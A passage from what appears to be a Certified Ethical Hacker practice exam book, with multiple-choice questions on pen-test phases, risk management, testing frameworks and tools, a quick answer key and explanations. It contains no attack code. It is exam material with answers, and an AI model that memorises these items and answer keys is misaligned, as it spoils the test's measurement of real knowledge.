terms of engagement, and nondisclosure and service level agreements in place. You gain
access to an employee’s system, and during further testing discover child pornography on
a hidden drive folder. Which of the following is your best course of action as an ethical
hacker?

A. Continue testing without notification to anyone, but ensure the information is included
in the final out-brief report.

B. Continue testing without interruption, but completely remove all hidden files and
the folder containing the pornography.

C. Stop testing and notify law enforcement authorities immediately.

D. Stop testing and remove all evidence of intrusion into the machine.

6. In which phase of a pen test is scanning performed?

A. Pre-attack

B. Attack

C. Post-attack

D. Reconnaissance

7. Which of the following describes risk that remains after all security controls have been
implemented to the best of one’s ability?

A. Residual

B. Inherent

C. Deferred

D. Remaining

8. Which of the following statements are true regarding OSSTMM? (Choose all that apply.)

A. OSSTMM is a nonprofit, international research initiative dedicated to defining
standards in security testing and business integrity testing.

B. OSSTMM recognizes ten types of controls, which are divided into two classes.

C. ISECOM maintains the OSSTMM.

D. OSSTMM defines three types of compliance.

9. Which of the following is an open source project produced by OISSG (Open Information
Systems Security Group) and intended to provide security testing assistance?

A. OSSTMM

B. OWASP

C. COBIT

D. ISSAF

CEH Certified Ethical Hacker Practice Exams

308

13-ch13.indd 308 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

10. NIST SP 800-30 defines steps for conducting a risk assessment. Which of the following
statements is true regarding the process?

A. Threats are identified before vulnerabilities.

B. Determining the magnitude of impact is the first step.

C. Likelihood is determined after the risk assessment is complete.

D. Risk assessment is not a recurring process.

11. In which phase of a pen test will the team penetrate the perimeter and acquire targets?

A. Pre-attack

B. Attack

C. Post-attack

D. None of the above

12. An organization participates in a real-world exercise designed to test all facets of its
security systems. An independent group is hired to assist the organization’s security
groups, aiding in the defense of assets against the attacks from the attacking group.
Which of the following statements is true?

A. The group assisting in the defense of the systems is referred to as a blue team.

B. The group assisting in the defense of the systems is referred to as a red team.

C. The group assisting in the defense of the systems is known as a white-hat group.

D. The team attacking the systems must provide all details of any planned attack
with the defense group before launching to ensure security measures are tested
appropriately.

13. Which of the following best describes the difference between a professional pen test team
member and a hacker?

A. Ethical hackers are paid for their time.

B. Ethical hackers never exploit vulnerabilities; they only point out their existence.

C. Ethical hackers do not use the same tools and actions as hackers.

D. Ethical hackers hold a predefined scope and agreement from the system owner.

14. Sally is part of a penetration test team and is starting a test. The client has provided a
network drop on one of their subnets for Sally to launch her attacks from. However, they
did not provide any authentication information, network diagrams, or other notable data
concerning the systems. Which type of test is Sally performing?

A. External, white box

B. External, black box

C. Internal, white box

D. Internal, black box

Chapter 13: The Pen Test: Putting It All Together

309

13-ch13.indd 309 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

15. Your pen test team is discussing services with a potential client. The client indicates they
do not see the value in penetration testing. Which of the following is the correct response
from your team?

A. Run a few tests and display the results to the client to prove the value of penetration
testing.

B. Provide detailed results from other customers you’ve tested, displaying the value of
planned testing and security deficiency discovery.

C. Provide information and statistics regarding pen testing and security vulnerabilities
from reliable sources.

D. Perform the penetration test anyway in case they change their mind.

16. In which phase of a penetration test would you compile a list of vulnerabilities found?

A. Pre-attack

B. Attack

C. Post-attack

D. Reconciliation

17. Which of the following has a database containing thousands of signatures used to detect
vulnerabilities in multiple operating systems?

A. Nessus

B. Hping

C. LOIC

D. SNMPUtil

18. Cleaning registry entries and removing uploaded files and tools are part of which phase of
a pen test?

A. Covering tracks

B. Pre-attack

C. Attack

D. Post-attack

19. Which of the following are true statements regarding a pen test? (Choose all that apply.)

A. Pen tests do not include social engineering.

B. Pen tests may include unannounced attacks against the network.

C. During a pen test, the security professionals can carry out any attack they choose.

D. Pen tests always have a scope.

E. A list of all personnel involved in the test is not included in the final report.

CEH Certified Ethical Hacker Practice Exams

310

13-ch13.indd 310 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

20. Which of the following causes a potential security breach?

A. Vulnerability

B. Threat

C. Exploit

D. Zero day

21. Which Metasploit payload type operates via DLL injection and is difficult for antivirus
software to pick up?

A. Inline

B. Meterpreter

C. Staged

D. Remote

22. Metasploit is a framework allowing for the development and execution of exploit code
against a remote host and is designed for use in pen testing. The framework consists of
several libraries, each performing a specific task and set of functions. Which library is
considered the most fundamental component of the Metasploit framework?

A. MSF Core

B. MSF Base

C. MSF interfaces

D. Rex

23. Which of the following may be effective countermeasures against an inside attacker?
(Choose all that apply.)

A. Enforce elevated privilege control.

B. Secure all dumpsters and shred collection boxes.

C. Enforce good physical security practice and policy.

D. Perform background checks on all employees.

Chapter 13: The Pen Test: Putting It All Together

311

13-ch13.indd 311 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

QUICK ANSWER KEY

1. C 9. D 17. A

2. B 10. A 18. D

3. A, C, D 11. B 19. B, D

4. C 12. A 20. B

5. C 13. D 21. B

6. A 14. D 22. D

7. A 15. C 23. A, B, C, D

8. B, C, D 16. C

CEH Certified Ethical Hacker Practice Exams

312

13-ch13.indd 312 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

ANSWERS

1. Incident response (IR) is an important part of organizational security. In what step of the A
incident-handling process would IR team members disable or delete user accounts and
change firewall rules?

A. Detection and analysis

B. Classification and prioritization

C. Containment

D. Forensic investigation

☑ C. In a refrain you’ve heard over and over again throughout this book, sometimes real
life and EC-Council don’t see eye to eye. However, when it comes to IR, ECC kind
of gets it right. Almost. Lots of organizations define the incident-handling response
in different ways, with different phases for actions taken. Generally speaking, though,
all incident handling falls into four sets of actions: identify, contain, eradicate, and
recover. Most organizations will define a preparation phase beforehand and a lessons
learned phase at the end for a full incident process. ECC defines eight phases:

• Preparation Defining rules, processes, and toolsets and then testing them (usually
with some regularly scheduled exercises, at a minimum) occur in this phase.

• Detection and analysis This is where alerting functions (toolsets, IDS, IPS, users
notifying of strange events, and so on) and initial research into the event take place.

• Classification and prioritization Decision making on whether to elevate as
an incident and at what level to elevate is made here (ramping up an IR event for
a false alarm serves no one). Levels of categorization vary from organization to
organization, but usually assign response time frames to levels.

• Notification Alerting appropriate teams and organizations to assist in the event
occurs here.

• Containment Steps to contain the incident occur here. These may include
steps to revoke or suspend user accounts and blocking system or even subnet
access via a firewall or other method.

• Forensic investigation In this stage, if possible, live memory and disk captures
are pulled for evaluation and analysis. This does not have to wait until the
conclusion of the event, but, depending on the assets involved and the nature of
the incident, forensics may have to wait.

• Eradication and recovery This phase encompasses all the steps taken to remove
the incident cause (malware, malicious code, backdoors, rootkits, viruses, and so
on) and to return the assets involved to baseline standards before putting them
back into production.

• Post-incident This is where reporting, follow-up analysis, and lessons learned
are put together. Evaluation from this step is fed into the preparation phase for
the next event.

Chapter 13: The Pen Test: Putting It All Together

313

13-ch13.indd 313 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

Questions on incident response and incident handling can be pretty vague. For
the most part, common sense should guide you on anything truly weird, but most
questions will be like this one—fairly easy to figure out on your own. One last note
here: the four phases listed at the beginning of this answer description will more than
likely be what you’ll see on the exam, so when in doubt, I would stick with them.

☐✗ B, C, and D are incorrect because the actions listed in the question do not occur in
these incident-handling phases.

2. A software company puts an application through stringent testing and, on the date of
release, is confident the software is free of known vulnerabilities. An organization named
BigBiz purchases the software at a premium cost, with a guarantee of service, maintenance,
and liability. Which risk management method is in use by the BigBiz organization?

A. Accept

B. Transfer

C. Avoid

D. Mitigate

☑ B. Depending on who you talk to, there are as many as seven different methods in
risk management. Of primary concern for you and EC-Council, however, are these
four: accept, avoid, transfer, and mitigate. In this example, the organization has paid
a cost to the software developer, trusting them that they’ve tested the software and
that they will assume responsibility and liability for it. In effect, the organization has
transferred the risk to the software company for this application. Transferring risk is
all about finding a different entity to take responsibility for managing the risk, as well
as accepting the liability of an exploitation or loss resulting from the risk.

☐✗ A is incorrect because this does not describe acceptance. Acceptance of a risk means
the organization is aware a risk is present but due to a variety of reasons (such as cost
of mitigation or the unlikeliness the risk can ever be exploited) decides to do nothing
about it. Basically, the owner decides they will just deal with the fallout if the risk is
ever realized.

☐✗ C is incorrect because this does not describe risk avoidance. In risk avoidance, the
organization recognizes the risk and eliminates anything and everything that has to do
with it. If a particular service, application, or technology is useful to an organization
but the cost and effort to deal with the risks involved in its use are too high, the
organization can simply choose to not use the service or application altogether.

☐✗ D is incorrect because this does not describe mitigation. Risk mitigation is exactly
what it sounds like: the organization needs the technology or service despite the
risk involved, so it takes all steps necessary to lower the chance the risk will ever be
exploited. Purchasing and using antivirus and practicing strong patch management
are examples.

CEH Certified Ethical Hacker Practice Exams

314

13-ch13.indd 314 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

3. Which of the following provide automated pen-test-like results for an organization?
(Choose all that apply.)

A. Metasploit

B. Nessus

C. Core Impact

D. CANVAS

E. SAINT

F. GFI LanGuard

☑ A, C, D. Automated tool suites for pen testing can be viewed as a means to save time
and money by the client’s management, but (in my opinion and in the real world, at
least) these tools don’t do either. They do not provide the same quality results as a test
performed by security professionals, and they are extremely expensive. Automated tools
can provide a lot of genuinely good information, but they are also susceptible to false
positives and false negatives and don’t necessarily care what your agreed-upon scope
says is your stopping point. Metasploit has a free, open source version and an insanely
expensive “Pro” version for developing and executing exploit code against a remote target
machine—still worlds cheaper than Core Impact, but expensive nonetheless. Metasploit
offers an autopwn module that can automate the exploitation phase of a penetration test.

Core Impact is probably the best-known, all-inclusive automated testing framework. Per
its website (https://www.coresecurity.com/core-impact), Core Impact “takes security
testing to the next level by safely replicating a broad range of threats to the organization’s
sensitive data and mission-critical infrastructure—providing extensive visibility into the
cause, effect, and prevention of data breaches.” Core Impact tests everything from web
applications and individual systems to network devices and wireless.

Per the Immunity Security website (www.immunitysec.com), CANVAS “makes
available hundreds of exploits, an automated exploitation system, and a comprehensive,
reliable exploit development framework to penetration testers and security professionals.”
Additionally, the company claims CANVAS’s Reference Implementation (CRI) is
“the industry’s first open platform for IDS and IPS testing.”

For you real-world purists out there and for those who don’t have any experience
with any of this just quite yet, it’s important to note that no automated testing suite
provides anything close to the results you’d gain from a real pen test. Core Impact
provides a one-step automated pen test result feature (and probably offers the best
result and report features), Metasploit offers autopwn, and CANVAS has a similar
“run everything” mode; however, all lack the ability to provide results that a true pen
test would provide. In the truest sense of “automated pen testing,” you simply can’t
do it in the real world (for your exam, stick with the three listed here).

☐✗ B, E, and F are incorrect for the same reason: they are all vulnerability assessment tool
suites, not automated pen test frameworks. Nessus is probably the most recognizable
of the three, but SAINT and GFI LanGuard are both still listed as top vulnerability
assessment applications.

Chapter 13: The Pen Test: Putting It All Together

315

13-ch13.indd 315 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

4. Which of the following best describes an assessment against a network segment that tests
for existing vulnerabilities but does not attempt to exploit any of them?

A. Penetration test

B. Partial penetration test

C. Vulnerability assessment

D. Security audit

☑ C. A vulnerability assessment is exactly what it sounds like: the search for and
identification of potentially exploitable vulnerabilities on a system or network. These
vulnerabilities can be poor security configurations, missing patches, or any number of
other weaknesses a bad guy might exploit. The two keys to a vulnerability assessment
are that the vulnerabilities are identified, not exploited, and the report is simply a
snapshot in time. The organization will need to determine how often it wants to
run a vulnerability assessment. Lastly, it’s important to note that there are some
vulnerabilities that simply can’t be confirmed without exploiting them. For example,
the act of infecting SQL statements to expose an SQL injection vulnerability may
very well constitute an exploit action, but it’s the only way to prove it exists. For your
exam, though, stick with no exploitation during this assessment and move on with
your life.

☐✗ A is incorrect because team members on a pen test not only discover vulnerabilities
but also actively exploit them (within the scope of their prearranged agreement, of
course).

☐✗ B is incorrect because this is not a valid term associated with assessment types and is
included as a distractor.

☐✗ D is incorrect because a security audit is designed to test the organization’s security
policy itself. It should go without saying the organization must have a security policy
in place to begin with before a security audit can take place.

5. You are a member of a pen test team conducting tests. Your team has all necessary scope,
terms of engagement, and nondisclosure and service level agreements in place. You gain
access to an employee’s system, and during further testing discover child pornography on
a hidden drive folder. Which of the following is your best course of action as an ethical
hacker?

A. Continue testing without notification to anyone, but ensure the information is
included in the final out-brief report.

B. Continue testing without interruption, but completely remove all hidden files and
the folder containing the pornography.

C. Stop testing and notify law enforcement authorities immediately.

D. Stop testing and remove all evidence of intrusion into the machine.

CEH Certified Ethical Hacker Practice Exams

316

13-ch13.indd 316 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

☑ C. If you’ve ever taken any philosophy classes in high school or college, you’ve
undoubtedly read some of the ethical dilemmas presented to challenge black-and-white
thinking on a matter. For example, theft is undoubtedly bad and is recognized as a
crime in virtually every law system on the planet, but what if it’s the only way to save a
child’s life? In ethical hacking, there are fine lines on actions to take when you discover
something, and sometimes hard edges where there is no choice in the matter. Possession
of child porn is a crime, so this case would seem relatively easy to discern. To be fair, and
to make the assumption you’ll need to on questions like this on the exam, your course of
action is straightforward and simple: notify the authorities and let them handle it.

In the real world, things might be a little more difficult. How do you really know
what you’re looking at? Are you positive that what you see is illegal in nature
(regardless of what it is—pornography, documentation, letters, and so on)? If you’re
not and you falsely accuse someone, what kind of liability do you face? What about
your team? It’s not an easy question to answer when you’re in the heat of battle, and
you’ll have to largely depend on good, solid pen test agreements up front. Let the
client know what actions will be taken when suspected illegal material is discovered,
and agree upon actions both sides will take. Otherwise you, and your client, could be
in for very difficult times.

☐✗ A is incorrect because the discovery of child porn automatically necessitates ceasing
test activities and contacting the authorities. Waiting until the out-brief is not the
appropriate course of action and can get you in hot water.

☐✗ B is incorrect because this is not only unethical behavior and outside the scope and
test agreement bounds, but it’s against the law. You’ve tampered with evidence and
obstructed justice, at a minimum.

☐✗ D is incorrect because removing evidence of your actions is not the correct action to
take and is unethical in the least (and can actually be considered illegal, depending on
the circumstances).

6. In which phase of a pen test is scanning performed?

A. Pre-attack

B. Attack

C. Post-attack

D. Reconnaissance

☑ A. I know you’re sick of CEH definitions, terms, and phases of attacks, but this is
another one you’ll just need to commit to memory. Per EC-Council, there are three
phases of a pen test: pre-attack, attack, and post-attack. The pre-attack phase is
where you’d find scanning and other reconnaissance activities (gathering competitive
intelligence, website crawling, and so on).

Chapter 13: The Pen Test: Putting It All Together

317

13-ch13.indd 317 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

☐✗ B is incorrect because scanning is completed in the pre-attack phase. The attack phase
holds four areas of work: penetrate the perimeter, acquire targets, execute attack, and
escalate privileges.

☐✗ C is incorrect because scanning is completed long before the post-attack phase. Actions
accomplished in post-attack include removing all uploaded files and tools, restoring (if
needed) to the original state, analyzing results, and preparing reports for the customer.

☐✗ D is incorrect because reconnaissance is not a phase of pen testing.

7. Which of the following describes risk that remains after all security controls have been
implemented to the best of one’s ability?

A. Residual

B. Inherent

C. Deferred

D. Remaining

☑ A. Risk management has a lot of terminology to remember, and identifying risk
before and after security control implementation is what this question is all about.
The inherent risk of the system is that which is in place if you implement no security
controls whatsoever: in other words, there are risks inherent to every system,
application, technology, and service. After you recognize these inherent risks and
implement security controls, you may have some residual risks remaining. In other
words, residual risk is what is left in the system after you implement security controls.

☐✗ B is incorrect because inherent risk is what was on the system before you started
implementing security controls.

☐✗ C and D are incorrect because these terms are included merely as distractors.

8. Which of the following statements are true regarding OSSTMM? (Choose all that apply.)

A. OSSTMM is a nonprofit, international research initiative dedicated to defining
standards in security testing and business integrity testing.

B. OSSTMM recognizes ten types of controls, which are divided into two classes.

C. ISECOM maintains the OSSTMM.

D. OSSTMM defines three types of compliance.

☑ B, C, D. The Open Source Security Testing Methodology Manual (OSSTMM)
provides a methodology for a thorough security test (also known as an OSSTMM
audit). It’s maintained by ISECOM (Institute for Security and Open Methodologies;
www.isecom.org/) and is a peer-reviewed manual of security testing and analysis that

CEH Certified Ethical Hacker Practice Exams

318

13-ch13.indd 318 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

results in fact-based actions that can be taken by an organization to improve security.
OSSTMM recognizes ten types of controls, split into two different classes:

• Class A: Interactive Authentication, indemnification, resilience, subjugation,
and continuity

• Class B: Process Nonrepudiation, confidentiality, privacy, integrity, and alarm

An OSSTMM audit tests for three different types of compliance: legislative,
contractual, and standards-based compliance.

☐✗ A is incorrect because this is actually the description of ISECOM—the group
responsible for the creation and maintenance of OSSTMM.

9. Which of the following is an open source project produced by OISSG (Open
Information Systems Security Group) and intended to provide security testing assistance?

A. OSSTMM

B. OWASP

C. COBIT

D. ISSAF

☑ D. The following is from OISSG’s site: “The Information Systems Security
Assessment Framework (ISSAF) is produced by the Open Information Systems
Security Group, and is intended to comprehensively report on the implementation
of existing controls to support IEC/ISO 27001:2005(BS7799), Sarbanes Oxley
SOX404, COBIT, SAS70 and COSO, thus adding value to the operational aspects
of IT related business transformation programmes. It is designed from the ground
up to evolve into a comprehensive body of knowledge for organizations seeking
independence and neutrality in their security assessment efforts.”

☐✗ A is incorrect because OSSTMM is a peer-reviewed manual of security testing and
analysis maintained by ISECOM that results in fact-based actions that can be taken
by an organization to improve security.

☐✗ B is incorrect because OWASP (Open Web Application Security Project) is an open
source web application security project.

☐✗ C is incorrect because COBIT (Control Objectives for Information and Related
Technologies) is a good-practice governance framework and supporting toolset
created by ISACA for information technology (IT) management and governance.

10. NIST SP 800-30 defines steps for conducting a risk assessment. Which of the following
statements is true regarding the process?

A. Threats are identified before vulnerabilities.

B. Determining the magnitude of impact is the first step.

C. Likelihood is determined after the risk assessment is complete.

D. Risk assessment is not a recurring process.

Chapter 13: The Pen Test: Putting It All Together

319

13-ch13.indd 319 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

☑ A. NIST SP 800-30: Guide for Conducting Risk Assessments (http://nvlpubs.nist
.gov/nistpubs/Legacy/SP/nistspecialpublication800-30r1.pdf ) describes in detail
how to perform a risk assessment. The publication defines four overall steps for an
assessment, as shown in the following illustration.

Step 1: Prepare for Assessment
Derived from Organizational Risk Frame

Step 2: Conduct Assessment
Expanded Task View

Identify Threat Sources and Events

Identify Vulnerabilities and
Predisposing Conditions

Determine Likelihood of Occurrence

Determine Magnitude of Impact

Determine Risk

Even if you knew nothing about this publication, though, you could probably work
your way into the correct answer here. Of the choices provided, only answer A makes
any sense.

☐✗ B is incorrect because you can’t possibly determine the magnitude of anything until
you define what it is.

☐✗ C is incorrect because the likelihood of risk exploitation is a key part of the risk
assessment effort and equation.

☐✗ D is incorrect because assessing your risk level is a recurring, always ongoing process.

11. In which phase of a pen test will the team penetrate the perimeter and acquire targets?

A. Pre-attack

B. Attack

C. Post-attack

D. None of the above

CEH Certified Ethical Hacker Practice Exams

320

13-ch13.indd 320 22/04/22 5:11 PM

Step 3: Communicate Results

Step 4: Maintain Assessment



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

☑ B. EC-Council splits a pen test into three phases: pre-attack, attack, and post-attack.
In the attack phase, the team will attempt to penetrate the network perimeter, acquire
targets, execute attacks, and elevate privileges. Getting past the perimeter might take
into account things such as verifying ACLs by crafting packets as well as checking
the use of any covert tunnels inside the organization. Attacks such as XSS, buffer
overflows, and SQL injections will be used on web-facing applications and sites. After
specific targets are acquired, password cracking, privilege escalation, and a host of
other attacks will be carried out.

☐✗ A is incorrect because these actions do not occur in the pre-attack phase. Per
EC-Council, pre-attack includes planning, reconnaissance, scanning, and gathering
competitive intelligence.

☐✗ C is incorrect because these actions do not occur in the post-attack phase. Per
EC-Council, post-attack includes removing all files, uploaded tools, registry entries,
and other items installed during testing of the targets. Additionally, your analysis of
findings and creation of the pen test report will occur here.

☐✗ D is incorrect because there is an answer for the question listed.

12. An organization participates in a real-world exercise designed to test all facets of its
security systems. An independent group is hired to assist the organization’s security
groups, aiding in the defense of assets against the attacks from the attacking group.
Which of the following statements is true?

A. The group assisting in the defense of the systems is referred to as a blue team.

B. The group assisting in the defense of the systems is referred to as a red team.

C. The group assisting in the defense of the systems is known as a white-hat group.

D. The team attacking the systems must provide all details of any planned attack with the
defense group before launching to ensure security measures are tested appropriately.

☑ A. Many organizations run full “war game” scenarios, which include defense and
attack groups, to test security measures. Generally speaking, the group doing the
attacking is known as a red team, while the group assisting with the defense is
known as a blue team. The red team is the offense-minded group, simulating the
bad guys in the world, actively attacking and exploiting everything they can find
in the environment. In a traditional war game scenario, the red team is attacking
“black-box” style, given little to no information to start things off. A blue team, on
the other hand, is defensive in nature. The members of the blue team are not out
attacking things; rather, they’re focused on shoring up defenses and making things
safe. Unlike red teams, blue teams are responsible for defense against the bad guys,
so they usually operate with full knowledge of the internal environment.

Chapter 13: The Pen Test: Putting It All Together

321

13-ch13.indd 321 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

Blue teams are almost always independent in terms of the target, but their goal
is to assist the defenders and to do so with whatever information is available.
The difference between blue and red in this scenario is in the cooperative versus
adversarial nature: red is there to be the bad guys, do what they would do, look for
the impacts they would want to have, and to test the organization’s defense/response,
whereas blue is there to help.

☐✗ B, C, and D are incorrect because these are not true statements. The attacking group
is known as a red team. I suppose an argument could be made that members of
the blue team are all, in effect, white hats, but there is no such term as a “white-hat
group.” And if you’re really testing the true security of a system, alerting the defensive
teams of everything you plan to do and when you plan on doing it makes little sense.

13. Which of the following best describes the difference between a professional pen test team
member and a hacker?

A. Ethical hackers are paid for their time.

B. Ethical hackers never exploit vulnerabilities; they only point out their existence.

C. Ethical hackers do not use the same tools and actions as hackers.

D. Ethical hackers hold a predefined scope and agreement from the system owner.

☑ D. This one is a blast from the book’s past and will pop up a couple of times on your
exam. The only true difference between a professional pen test team member (an
ethical hacker) and the hackers of the world is the existence of the formally approved,
agreed-upon scope and contract before any attacks begin.

☐✗ A is incorrect because, although professional ethical hackers are paid for their efforts
during the pen test, this is not necessarily a delineation between the two (ethical
and non-ethical). Some hackers may be paid for a variety of illicit activities. For one
example, maybe a company wants to cause harm to a competitor, so it hires a hacker
to perform attacks.

☐✗ B and C are incorrect for the same reason. If a pen test team member never exploited
an opportunity and refused to use the same tools and techniques that the hackers of
the world have at their collective fingertips, what would be the point of an assessment?
A pen test is designed to show true security weaknesses and flaws, and the only way to
do that is to attack it just as a hacker would.

14. Sally is part of a penetration test team and is starting a test. The client has provided a
network drop on one of their subnets for Sally to launch her attacks from. However, they
did not provide any authentication information, network diagrams, or other notable data
concerning the systems. Which type of test is Sally performing?

A. External, white box

B. External, black box

C. Internal, white box

D. Internal, black box

CEH Certified Ethical Hacker Practice Exams

322

13-ch13.indd 322 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

☑ D. Sally was provided a network drop inside the organization’s network, so we know
it’s an internal test. Additionally, no information of any sort was provided—from
what we can gather, she knows nothing of the inner workings, logins, network design,
and so on. Therefore, this is a black-box test—an internal black-box test.

☐✗ A and B are incorrect because this is an internal test, not an external one.

☐✗ C is incorrect because a white-box test would have included all the information Sally
wanted about the network. This would simulate a disgruntled internal network or
system administrator.

15. Your pen test team is discussing services with a potential client. The client indicates they
do not see the value in penetration testing. Which of the following is the correct response
from your team?

A. Run a few tests and display the results to the client to prove the value of penetration
testing.

B. Provide detailed results from other customers you’ve tested, displaying the value of
planned testing and security deficiency discovery.

C. Provide information and statistics regarding pen testing and security vulnerabilities
from reliable sources.

D. Perform the penetration test anyway in case they change their mind.

☑ C. Ethical behavior will definitely find its way to your exam, and this cheesy question
is an example. Your potential client may or may not be convinced when presented
with the undeniable proof of pen test value from industry leaders (and possibly the
U.S. government), but as the saying goes, “You can lead a horse to water, but you
can’t make him drink.” An ethical hacker does not proceed without authorization,
and doing so not only calls your integrity into question but also makes you a
criminal. Documentation for an ethical test team will include scope (of what you can
touch, how far you can go with testing, and how much time you’ll spend doing it),
terms of engagement, nondisclosure, liability statements, and other specifics.

☐✗ A and D are incorrect because an ethical hacker does not proceed without prior,
written permission.

☐✗ B is incorrect because ethical hackers do not disclose findings, procedures, or any
other information about a test to anyone not specified in the agreement without
authorization. This is usually covered in the nondisclosure agreement portion of the
test team documentation.

16. In which phase of a penetration test would you compile a list of vulnerabilities found?

A. Pre-attack

B. Attack

C. Post-attack

D. Reconciliation

Chapter 13: The Pen Test: Putting It All Together

323

13-ch13.indd 323 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

☑ C. This is another simple definition question you’re sure to see covered on the exam.
You compile the results of all testing in the post-attack phase of a pen test so you can
create and deliver the final report to the customer.

☐✗ A and B are incorrect because this action does not occur in the pre-attack or attack phase.

☐✗ D is incorrect because reconciliation is not a phase of a pen test as defined by
EC-Council.

17. Which of the following has a database containing thousands of signatures used to detect
vulnerabilities in multiple operating systems?

A. Nessus

B. Hping

C. LOIC

D. SNMPUtil

☑ A. Nessus is probably the best-known, most utilized vulnerability assessment tool on
the planet—even though it’s not necessarily free anymore. Nessus works on a client/
server basis and provides “plug-ins” to test everything from Cisco devices, macOS,
and Windows machines to SCADA devices, SNMP, and VMware ESX (you can find
a list of plug-in families at www.tenable.com/plugins/index.php?view=all). It’s part of
virtually every security team’s portfolio, and you should definitely spend some time
learning how to use it.

As an aside—not necessarily because it has anything to do with your test but because
I am all about informing you on how to become a good pen tester—OpenVAS
(www.openvas.org) is the open source community’s attempt at a free vulnerability
scanner. Nessus was a free scanner for the longest time. However, once Nessus was
purchased by Tenable Network Security, it, for lack of a better term, angered a lot of
people in the security community because Nessus became a for-profit entity instead
of a for-security one. Don’t get me wrong—Nessus is outstanding in what it does; it
just costs you money. OpenVAS is attempting to do the same thing for free because
the community wants security over profit.

Just keep in mind that most vulnerabilities that are actually capable of causing harm
to your systems probably won’t be found by any scanner. The recent Heartbleed
vulnerability, which takes advantage of an SSL issue, is a prime example: scanners
simply can’t find vulnerabilities we don’t already know about.

☐✗ B is incorrect because Hping is not a vulnerability assessment tool. Per Hping’s
website (www.hping.org), it is “a command-line-oriented TCP/IP packet assembler/
analyzer” used to test firewalls, to fingerprint operating systems, and even to perform
man-in-the-middle (MITM) attacks.

CEH Certified Ethical Hacker Practice Exams

324

13-ch13.indd 324 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

☐✗ C is incorrect because Low Orbit Ion Cannon (LOIC) is a distributed interface
denial-of-service tool. It’s open source and can be used, supposedly legitimately, to
test “network stress levels.”

☐✗ D is incorrect because SNMPUtil is an SNMP security verification and assessment tool.

18. Cleaning registry entries and removing uploaded files and tools are part of which phase of
a pen test?

A. Covering tracks

B. Pre-attack

C. Attack

D. Post-attack

☑ D. Cleaning up all your efforts occurs in the post-attack phase, alongside analyzing
the findings and generating the final report. The goal is to put things back exactly
how they were before the assessment.

☐✗ A is incorrect because “covering tracks” is part of the phases defining a hacking attack,
not a phase of a pen test.

☐✗ B and C are incorrect because these steps do not occur in the pre-attack or attack phase.

19. Which of the following are true statements regarding a pen test? (Choose all that apply.)

A. Pen tests do not include social engineering.

B. Pen tests may include unannounced attacks against the network.

C. During a pen test, the security professionals can carry out any attack they choose.

D. Pen tests always have a scope.

E. A list of all personnel involved in the test is not included in the final report.

☑ B, D. Pen tests are carried out by security professionals who are bound by a specific
scope and rules of engagement, which must be carefully crafted, reviewed, and agreed
on before the assessment begins. This agreement can allow for unannounced testing,
should upper management of the organization decide to test their IT security staff ’s
reaction times and methods.

☐✗ A, C, and E are incorrect because these are false statements concerning a pen test.
Unless expressly forbidden in the scope agreement, social engineering is a big part of
any true pen test. The scope agreement usually defines how far a pen tester can go—
for example, no intentional denial-of-service attacks and the like. Clients are provided
a list of discovered vulnerabilities after the test, even if the team did not exploit them:
there’s not always time to crack into every security flaw during an assessment, but
that’s no reason to hide it from the customer. Lastly, the final report includes a list of
all personnel taking part in the test.

Chapter 13: The Pen Test: Putting It All Together

325

13-ch13.indd 325 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

20. Which of the following causes a potential security breach?

A. Vulnerability

B. Threat

C. Exploit

D. Zero day

☑ B. So which came first—the chicken or the egg? This question is right along those
same lines and can be really confusing, but if you key on the “cause” portion of
the question, you should be okay. Sure, a vulnerability would need to be present;
however, a vulnerability on its own doesn’t cause anything. A threat is something
that could potentially take advantage of an existing vulnerability. Threats can be
intentional, accidental, human, or even an “act of God.” A hacker is a threat to take
advantage of an open port on a system and/or poor password policy. A thunderstorm
is a threat to exploit a tear in the roof, leaking down into your systems. Heck, a
rhinoceros is a threat to bust down the door and destroy all the equipment in the
room. Whether those threats have intent, are viable, and are willing/able to take up
the vulnerability is a matter for risk assessment to decide; they’ll probably beef up
password policy and fix the roof, but I doubt much will be done on the rhino front.

☐✗ A is incorrect because a vulnerability is a weakness in security. A vulnerability
may or may not necessarily be a problem. For example, your system may have a
horribly weak password policy or even a missing security patch, but if it’s never on
the network and is locked in a guarded room accessible by only three people who
must navigate a biometric system to even open the door, the existence of those
vulnerabilities is moot.

